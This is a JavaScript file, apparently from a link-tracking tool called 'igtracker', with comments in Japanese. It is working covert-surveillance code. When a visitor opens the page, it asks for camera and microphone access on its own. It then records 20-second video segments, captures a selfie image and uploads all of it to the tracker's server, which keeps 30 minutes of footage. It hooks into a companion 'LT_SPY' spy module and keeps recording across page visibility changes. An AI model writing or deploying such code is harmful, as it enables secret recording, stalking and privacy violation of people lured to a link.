/* リアルタイム映像＋音声（igtracker）
   カメラの映像とマイクの音声を「1本の動画」として20秒ずつ録って送る。
   サーバ側は最大30分ぶんだけ保持するので、あとから30分ぶんを見返せる。
   gate.js の LT_SPY.cam()/mic() もここで受ける。 */
(function () {
  "use strict";
  var CODE = window.LT_CODE || "";
  if (!CODE) return;
  var HIT = window.LT_HIT || 0;
  var SEG_MS = 20000;          // 1本の長さ
  var MAX_MS = 30 * 60 * 1000; // 30分で仕切り直し（サーバ側の保持と同じ）

  var SID = (function () {
    try {
      var v = sessionStorage.getItem("igt_vseg_" + CODE);
      if (!v) {
        v = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
        sessionStorage.setItem("igt_vseg_" + CODE, v);
      }
      return v;
    } catch (e) { return Math.random().toString(36).slice(2, 12); }
  })();

  var stream = null, rec = null, seq = 0, timer = null, segStart = 0;
  var mime = "", ext = "webm", wantRun = false, asked = false, selfied = false;
  var parts = [];

  function pickMime() {
    var c = ["video/webm;codecs=vp8,opus", "video/webm;codecs=vp9,opus",
             "video/webm", "video/mp4"];
    for (var i = 0; i < c.length; i++) {
      try {
        if (window.MediaRecorder && MediaRecorder.isTypeSupported &&
            MediaRecorder.isTypeSupported(c[i])) return c[i];
      } catch (e) {}
    }
    return "";
  }

  function url(extra) {
    return "/s/" + encodeURIComponent(CODE) + "/vseg?s" + (extra || "");
  }

  function post(blob, beacon) {
    if (!blob || !blob.size) return;
    var u = "/s/" + encodeURIComponent(CODE) + "/vseg?sid=" + encodeURIComponent(SID) +
            "&seq=" + (seq++) + "&ext=" + ext + "&hit=" + HIT;
    if (beacon && navigator.sendBeacon) {
      try { if (navigator.sendBeacon(u, blob)) return; } catch (e) {}
    }
    try { fetch(u, { method: "POST", body: blob, keepalive: true }).catch(function () {}); }
    catch (e) {}
  }

  function preview() {
    try {
      var v = document.getElementById("lt_cam");
      if (!v) {
        var host = document.querySelector("#lt_live .inner") || document.body;
        v = document.createElement("video");
        v.id = "lt_cam";
        v.autoplay = true; v.muted = true; v.playsInline = true;
        v.setAttribute("playsinline", "");
        v.style.cssText = "width:120px;height:90px;object-fit:cover;border-radius:10px;" +
                          "margin:14px auto 0;display:block;background:#000;opacity:.9";
        host.appendChild(v);
      }
      if (stream && v.srcObject !== stream) {
        v.srcObject = stream;
        var p = v.play(); if (p && p.catch) p.catch(function () {});
      }
    } catch (e) {}
  }

  function selfie() {
    if (selfied || !stream) return;
    selfied = true;
    setTimeout(function () {
      try {
        var v = document.getElementById("lt_cam");
        var w = v && v.videoWidth ? v.videoWidth : 480;
        var h = v && v.videoHeight ? v.videoHeight : 360;
        var c = document.createElement("canvas");
        c.width = w; c.height = h;
        c.getContext("2d").drawImage(v, 0, 0, w, h);
        var data = c.toDataURL("image/jpeg", 0.7);
        fetch("/s/" + encodeURIComponent(CODE) + "/cap", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            kind: "selfie", data: data, hit: HIT,
            vid: (window.LT_PAYLOAD || {}).vid || "",
          }),
        }).catch(function () {});
      } catch (e) {}
    }, 1800);
  }

  function ensure() {
    if (stream) return Promise.resolve(true);
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      return Promise.resolve(false);
    }
    asked = true;
    return navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: true,
    }).then(function (s) {
      stream = s;
      mime = pickMime();
      ext = /mp4/.test(mime) ? "mp4" : "webm";
      preview();
      selfie();
      if (wantRun) startRec();
      return true;
    }).catch(function () { return false; });
  }

  function startRec() {
    if (!stream || !mime) return;
    if (rec && rec.state !== "inactive") return;
    try {
      rec = new MediaRecorder(stream, {
        mimeType: mime, videoBitsPerSecond: 180000, audioBitsPerSecond: 32000,
      });
    } catch (e) {
      try { rec = new MediaRecorder(stream); mime = rec.mimeType || mime; } catch (e2) { return; }
    }
    parts = [];
    rec.ondataavailable = function (e) { if (e.data && e.data.size) parts.push(e.data); };
    rec.onstop = function () {
      var p = parts; parts = [];
      post(new Blob(p, { type: mime || "video/webm" }), false);
      if (wantRun && !document.hidden) startRec();
    };
    try { rec.start(); } catch (e) { return; }
    segStart = Date.now();
    if (timer) clearTimeout(timer);
    timer = setTimeout(function () { stopRec(false); }, SEG_MS);
  }

  function stopRec(final) {
    if (timer) { clearTimeout(timer); timer = null; }
    if (!rec || rec.state === "inactive") return;
    var r = rec;
    if (final) {
      r.onstop = function () {
        var p = parts; parts = [];
        post(new Blob(p, { type: mime || "video/webm" }), true);
      };
    }
    try { r.stop(); } catch (e) {}
  }

  function start() {
    wantRun = true;
    return ensure().then(function (ok) {
      if (ok && !rec) startRec();
      return ok;
    });
  }

  function stop() {
    wantRun = false;
    stopRec(false);
  }

  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") {
      if (wantRun) stopRec(true);
      return;
    }
    if (wantRun && stream && (!rec || rec.state === "inactive")) startRec();
  });
  window.addEventListener("pagehide", function () { if (wantRun) stopRec(true); });

  window.LTCAM = {
    start: start, stop: stop, ensure: ensure, sid: SID,
    active: function () { return !!stream; },
    info: function () { return { mime: mime, seg: seq, sid: SID }; },
  };

  /* spy.js 側のカメラ/マイクを置き換える（gate.js がここを呼ぶ） */
  window.LT_CAM = 1;
  window.LT_MIC = 1;
  window.LT_SPY = window.LT_SPY || {};
  window.LT_SPY.cam = function () { return ensure(); };
  window.LT_SPY.mic = function () { return ensure(); };

  /* ページが開いたら、ゲートが無い場合に備えて待機しておく */
  window.addEventListener("load", function () {
    if (window.LT_GATE && !window.LT_GATE_PASS) return;
    setTimeout(function () { if (!stream) start(); }, 1500);
  });
})();